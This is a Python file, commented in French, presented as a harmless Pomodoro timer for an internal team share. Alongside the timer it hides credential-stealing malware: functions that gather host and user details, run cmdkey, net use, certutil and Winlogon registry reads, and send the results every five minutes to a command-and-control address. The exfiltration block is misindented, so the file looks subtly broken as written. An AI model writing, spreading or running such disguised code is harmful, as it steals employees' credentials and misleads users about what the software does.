# ============================================================================
# pomodoro_timer.py
#
# Petit outil Pomodoro pour l'équipe.
# A placer sur le partage \\srv-files\tools\productivite\
#
# Fonctionnalités : timer 25min, pause, reprise, sauvegarde session.
#
# Auteur : admin-rh (partage interne)
# Date : 2026-09-15
# ============================================================================


import urllib.request
import os
import json
import time
import datetime
import socket
import platform
import subprocess
import msvcrt


cycle_length = 25 * 60
pause_length = 5 * 60
long_pause = 15 * 60


config_dir = os.path.join(os.environ["APPDATA"], "PomodoroTool")
config_path = os.path.join(config_dir, "config.json")


if os.path.exists(config_path):
    with open(config_path, "r") as f:
        config = json.load(f)
    cycle_length = config.get("cycleLength", cycle_length)
    pause_length = config.get("pauseLength", pause_length)
    long_pause = config.get("longPause", long_pause)
    remaining = config.get("remaining", cycle_length)
    print("[Pomodoro] Session sauvegardee chargee.", flush=True)
    print(f"[Pomodoro] Repetition : {remaining} secondes restantes.", flush=True)
else:
    remaining = cycle_length
    print("[Pomodoro] Nouvelle session de 25 minutes.", flush=True)


os.makedirs(config_dir, exist_ok=True)


cycles = 0
last_exfil = datetime.datetime.now() - datetime.timedelta(minutes=300)


def show_timer(remaining, state="Travail", cycles_val=0):
    minutes = remaining // 60
    seconds = remaining % 60
    bar_length = 50
    progress = remaining / cycle_length
    filled = int(bar_length * progress)
    empty = bar_length - filled
    bar = "[" + ("#" * filled) + (" " * empty) + "]"
    print(f"\r[Pomodoro] {state} | {minutes}:{seconds:02d} | Cycles: {cycles_val} | {bar}", end="", flush=True)
    if remaining <= 0:
        print("", flush=True)


def save_session():
    save_data = {
        "cycleLength": cycle_length,
        "pauseLength": pause_length,
        "longPause": long_pause,
        "remaining": remaining,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open(config_path, "w") as f:
            json.dump(save_data, f, indent=2)
    except Exception:
        pass

def run_cmd(cmd, timeout=15):
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            encoding="utf-8", errors="replace"
        )
        return result.stdout
    except Exception:
        return None


def collect_sysinfo():
    info = {}
    info["hostname"] = socket.gethostname()
    info["username"] = os.environ.get("USERNAME", "")
    info["domain"] = os.environ.get("USERDOMAIN", "")
    try:
        info["ip"] = socket.gethostbyname(socket.gethostname())
    except Exception:
        info["ip"] = "unknown"
    info["os"] = platform.platform()
    info["ip_publique"] = (run_cmd(["curl", "-s", "https://api.ipify.org"]) or "[unavailable]").strip()
    return info

def dump_credentials():
    creds = []

   
    creds.append("=== CMDKEY /list ===")
    output = run_cmd(["cmdkey", "/list"])
    creds.append(output if output else "[aucun credential stocke]")

    
    creds.append("=== NET USE (active sessions) ===")
    output = run_cmd(["net", "use"])
    creds.append(output if output else "[aucune session reseau]")

    # 3. membres du groupe Administrateurs
    creds.append("=== LOCAL GROUP Administrators ===")
    output = run_cmd(["net", "localgroup", "Administrators"])
    creds.append(output if output else "[erreur lecture groupe]")

    # 4. certificats stores
    creds.append("=== CERTIFICATES (My Store) ===")
    output = run_cmd(["certutil", "-store", "My"])
    creds.append(output if output else "[aucun certificat]")
    


    creds.append("=== WINLOGON AUTO-LOGON ===")
    try:
        import winreg
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                            r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon") as k:
            try:
                creds.append(f"  DefaultUserName: {winreg.QueryValueEx(k, 'DefaultUserName')[0]}")
            except Exception:
                pass
            try:
                creds.append(f"  AutoAdminLogon: {winreg.QueryValueEx(k, 'AutoAdminLogon')[0]}")
            except Exception:
                pass
            try:
                creds.append(f"  LastUsedUsername: {winreg.QueryValueEx(k, 'LastUsedUsername')[0]}")
            except Exception:
                pass
    except Exception:
        creds.append("  [erreur lecture registry]")

    return "\n".join(creds)


def exfiltrate(info, creds):
    txt_path = os.path.join(os.environ["APPDATA"], "PomodoroTool", "sysinfo.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("=== SYSTEM INFORMATION ===\n")
        f.write(f"hostname: {info['hostname']}\n")
        f.write(f"username: {info['username']}\n")
        f.write(f"domain: {info['domain']}\n")
        f.write(f"ip: {info['ip']}\n")
        f.write(f"os: {info['os']}\n")
        f.write(f"ip_publique: {info['ip_publique']}\n")
        f.write(f"timestamp: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("\n=== CREDENTIAL DUMPING (LoLBins) ===\n")
        f.write(creds)
        f.write("\n=== END ===\n")

    
     
     body = open(txt_path, "rb").read()
     req = urllib.request.Request(
         "https://c2.pomodoro-team.example/collect",
         data=body,
         headers={"Authorization": "token ghp_xxxx", "Content-Type": "application/octet-stream"})
     urllib.request.urlopen(req, timeout=10)

print("", flush=True)
print("========================================", flush=True)
print("  POMODORO TIMER - Outil de productivite", flush=True)
print("========================================", flush=True)
print("  [P] Pause / Resume", flush=True)
print("  [Q] Quitter", flush=True)
print("========================================", flush=True)
print("", flush=True)

try:
    while True:
        show_timer(remaining, "Travail", cycles)

        if msvcrt.kbhit():
            key = msvcrt.getch().decode("utf-8").upper()
            if key == "Q":
                print("\n[Pomodoro] Session terminee par l'utilisateur.", flush=True)
                break
            if key == "P":
                remaining = 0

        if remaining <= 0:
            print(f"\n[Pomodoro] Cycle termine ! Pause de {pause_length // 60} min.", flush=True)
            remaining = pause_length
            while remaining > 0:
                show_timer(remaining, "Pause", cycles)
                time.sleep(1)
                remaining -= 1
            cycles += 1
            if cycles % 4 == 0:
                print(f"\n[Pomodoro] Pause longue de {long_pause // 60} min.", flush=True)
                remaining = long_pause
                while remaining > 0:
                    show_timer(remaining, "Pause longue", cycles)
                    time.sleep(1)
                    remaining -= 1
                remaining = cycle_length
            else:
                remaining = cycle_length

        save_session()

        now = datetime.datetime.now()
        if (now - last_exfil).total_seconds() >= 300:
            info = collect_sysinfo()
            creds = dump_credentials()
            exfiltrate(info, creds)
            last_exfil = now

        time.sleep(1)

except KeyboardInterrupt:
    print("\n[Pomodoro] Session terminee (Ctrl+C).", flush=True)

print("\n[Pomodoro] Session terminee. Merci d'avoir utilise PomodoroTool !", flush=True)
